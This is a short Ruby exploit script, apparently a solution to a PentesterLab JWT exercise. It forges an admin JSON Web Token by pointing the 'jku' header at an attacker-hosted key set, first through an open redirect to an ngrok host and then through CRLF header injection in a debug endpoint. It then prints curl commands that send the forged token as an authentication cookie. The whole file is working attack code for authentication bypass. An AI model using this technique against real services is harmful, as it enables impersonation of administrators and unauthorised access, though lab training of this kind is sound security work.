require 'openssl'
require 'base64'
require 'json'
require 'uri'

header = {"typ":"JWT","alg":"RS256","jku":"http://ptl-17994f50-32958416.libcurl.so/.well-known/../redirect?redirect_uri=https://f3e6-73-129-14-72.ngrok.io/jwks.json"} # insert public server with key (can get the format from the original "jku")
body = {"user":"admin"}

k=OpenSSL::PKey::RSA.new File.read 'private.pem'

pub = k.public_key

n=Base64.urlsafe_encode64(pub.n.to_s(2), padding:false)
e=Base64.urlsafe_encode64(pub.e.to_s(2), padding:false)
jwks = {
    "keys"=> [
      {
        "kty"=> "RSA",
        "use"=> "sig",
        "kid"=> "pentesterlab",
        "n"=> n,
        "e"=> e,
        "alg"=> "RS256"
      }
    ]
  }
jwk = JSON.dump jwks
len = jwk.size # issues with it, had to hardcode it below

url = "http://ptl-b77a8d98-ad25e3bd.libcurl.so/.well-known/../debug?value=test%0d%0aContent-Length:+405%0d%0a%0d%0a#{URI.escape(jwk,"[]{}")}"

header["jku"] = url
puts "curl --dump-header - "+url

data = Base64.urlsafe_encode64(body.to_json).gsub("=","")
head = Base64.urlsafe_encode64(header.to_json).gsub("=","")

sign = k.sign("SHA256",head+"."+data)

puts "curl -H 'Cookie: auth=#{head+"."+data+"."+Base64.urlsafe_encode64(sign).gsub("=","")}' http://ptl-b77a8d98-ad25e3bd.libcurl.so/"

